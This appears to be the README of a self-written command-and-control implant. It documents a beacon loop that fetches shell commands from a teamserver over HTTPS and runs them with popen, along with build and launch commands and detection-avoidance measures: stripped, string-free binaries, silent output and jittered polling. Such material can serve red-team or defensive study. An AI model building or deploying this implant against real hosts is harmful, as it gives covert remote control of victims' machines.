# Implant (agent)

The victim side. It polls the teamserver over HTTPS for work, runs what it is
given, uploads the output, and never listens on a port.

```
   1. build a 12-byte C2_HEADER {0x41414141, 100, 0}
   2. TCP connect → TLS handshake → POST /api/v2/metrics
   3. 204 → sleep 3–7s (jittered) → back to 1
      200 + CMD_EXIT          → exit
      200 + CMD_EXECUTE_SHELL → popen it, then POST /api/v2/events with the output
```

Each check-in is a fresh connection that lives for milliseconds. Nothing is held
open between beacons, so there is no session to notice and no broken socket to
recover from when the server restarts.

## Layout

| File | Contents |
| --- | --- |
| `agent.c` | argument parsing, the beacon loop, `popen`-based command execution |
| `https_client.c` | the transport: sockets, OpenSSL, request and response handling |
| `https_client.h` | `https_post()` |
| `../protocol.h` | `C2_HEADER` and the `CMD_*` constants, shared with the server |

## Why not libcurl

An implant that links libcurl drags in **35 shared libraries** that will not
exist on a foreign host. The hand-written transport brings that down to four:

```
libssl.so.3  libcrypto.so.3  libc.so.6  libz.so.1
```

`libz` is libcrypto's own dependency. That is the entire point of
`https_client.c`.

## Building

The implant is C17 with no GNU extensions (`_POSIX_C_SOURCE=200809L` is defined
for `popen`, `nanosleep` and `getaddrinfo`), and links only `OpenSSL::SSL`,
`OpenSSL::Crypto` and libc.

### Artifact hardening

The `agent` target is stripped as part of a normal build: `-s` and `-fno-ident`,
`-Wl,--build-id=none`, then an `objcopy` pass that removes `.comment` — the one
section `strip` cannot. The result carries no `.symtab`, no build id and no
compiler version, and no string in it names the beacon, the role or the paths.
Sanitizer builds skip all of it, since symbols are the point there.

It does not need cpp-httplib, so it builds without the teamserver — which is what
the container script does:

```sh
cmake -S . -B build-agent -DBUILD_SERVER=OFF
cmake --build build-agent --target agent
```

### In a container

`scripts/build-implant.sh` compiles the implant inside a container, which pins the
toolchain, the glibc symbol floor and the OpenSSL ABI instead of inheriting the
host's:

```sh
./scripts/build-implant.sh          # -> build-implant/agent
```

| Variable | Default | Meaning |
| --- | --- | --- |
| `BASE_IMAGE` | `debian:bookworm` | build image |
| `OUT_DIR` | `build-implant` | build tree, relative to the repo root |
| `CMAKE_ARGS` | — | extra arguments, e.g. `-DCMAKE_BUILD_TYPE=MinSizeRel` |
| `IMAGE` | `myc2-implant-build` | tag of the build image |

The container runs as the calling user, so the build tree is not left owned by
root. It also passes `--security-opt label=disable`, which is required on SELinux
hosts such as Fedora: a plain bind mount is labelled for the host and the
container gets `Permission denied` on `/src`. That relaxes the container's own
confinement instead of relabelling your files, which is what appending `:z` to the
mount would do.

Both the host build and the container build reference at most `GLIBC_2.34`, so
either runs on glibc 2.34 or newer (Debian 12, Ubuntu 22.04, RHEL 9). The
container does not lower that floor on its own — it makes the result
reproducible. An older base image is the only way below 2.34, and it drags the
older OpenSSL soname along with it (Debian 11 and Ubuntu 20.04 ship
`libssl.so.1.1` rather than `libssl.so.3`), so the victim's ABI decides which
base image you build against.

`-DENABLE_SANITIZERS=ON` works here too, and needs the sanitizer runtime
installed (`libasan`/`libubsan` on Fedora).

## Running

```sh
./build/agent
```

| Flag | Default | Meaning |
| --- | --- | --- |
| `--host` | `127.0.0.1` | teamserver address |
| `--port` | `8443` | teamserver port |
| `--ca` | `certs/server.pem` | certificate to pin |
| `--help`, `-h` | — | usage |

```sh
./build/agent --host 192.168.50.50
```

It prints nothing on start-up and nothing on a successful check-in. Only failures
reach `stderr`, none of them naming the role, the path or the destination:

```
request failed (500)
bad response
```

The port is validated as 1–65535; a non-numeric value, trailing junk or an
out-of-range number prints `invalid port: <value>` and exits with code 2. Unknown
flags do the same.

## Transport

`https_client.c` implements the subset of HTTPS this needs: `connect` with
timeouts, `SSL_connect`, one `POST`, then read to EOF.

| | |
| --- | --- |
| TLS version | minimum TLS 1.2 |
| verification | `SSL_VERIFY_PEER`, then an explicit `SSL_get_verify_result` check |
| identity | IP literal → `X509_VERIFY_PARAM_set1_ip_asc`; name → `set1_host` **and** SNI |
| handshake | `SSL_connect`, then the verify result is inspected before anything is sent |
| timeouts | 10s on connect, send and receive (`SO_RCVTIMEO`/`SO_SNDTIMEO`) |
| body transfer | chunked `SSL_write`, 4096-byte `SSL_read` loop into a growable buffer |
| connection | `Connection: close`; the response is read until the peer closes |

The request it writes:

```
POST /api/v2/metrics HTTP/1.1
Host: <host>
Content-Type: application/octet-stream
Content-Length: <n>
Connection: close
```

No `User-Agent` and no `Accept*` headers. Note that `Host` omits the port.

### Pinning is not exclusive

The client loads the system trust store **and** the `--ca` file:

```c
SSL_CTX_set_verify(ctx, SSL_VERIFY_PEER, NULL);
(void)SSL_CTX_set_default_verify_paths(ctx);
SSL_CTX_load_verify_locations(ctx, ca_file, NULL);
```

`load_verify_locations` adds anchors; it does not replace what
`set_default_verify_paths` loaded. Trust is the union of the two, so a host with
a corporate TLS-inspection root installed will accept a forged certificate for the
C2 hostname. For a bare IP target this is mostly academic, because public CAs do
not generally issue IP certificates; for a DNS name it is a real hole.
[`../../DEPLOYMENT.md`](../../DEPLOYMENT.md) tracks the fix.

## Beacon loop

`POLL_BASE_MS` is 5000 and `POLL_JITTER_PERCENT` is 40, so each interval is drawn
uniformly from 3000–7000 ms, to the millisecond. The seed is
`time(NULL) ^ getpid()`, and the sleep is `nanosleep` rather than an alarm or a
timer. Whole-second jitter was tried first and abandoned: every short draw rounded
to the same value, which left a visible 3s pattern.

A `200` response is verified before it is trusted: the body must be at least a
header, the `magic` must match, and `payload_size + 12` must equal the body length
exactly. Anything else prints `bad response` and the loop continues.

| command | action |
| --- | --- |
| `CMD_EXIT` | silently breaks the loop and exits 0 |
| `CMD_EXECUTE_SHELL` | `popen(cmd, "r")`, read up to `OUTPUT_MAX` bytes, `POST /api/v2/events` |

A failed beacon prints `request failed (<n>)` and retries on the next interval; a TLS failure prints the reason and the loop continues. The implant does
not give up on its own.

## Limitations

- **`OUTPUT_MAX` is 4096 bytes**, and output is only collected once the command
  exits — a long-running command produces nothing until it finishes.
- **Cadence is still periodic.** Jittered to 3–7s, but a fixed destination on a
  schedule remains a pattern in flow logs.
- **Binary-unsafe results.** Output is uploaded raw and printed raw by the server,
  so non-UTF-8 output corrupts the operator's terminal.
- **No authentication** of the server beyond the certificate check, and no client
  identity sent at all.
- **Command strings are passed to `popen`**, so `sh -c` semantics apply,
  metacharacters included.
- **No sleep/kill switch**, and no way to change the interval without rebuilding.
- **Runtime floor** of glibc 2.34 and `libssl.so.3`.
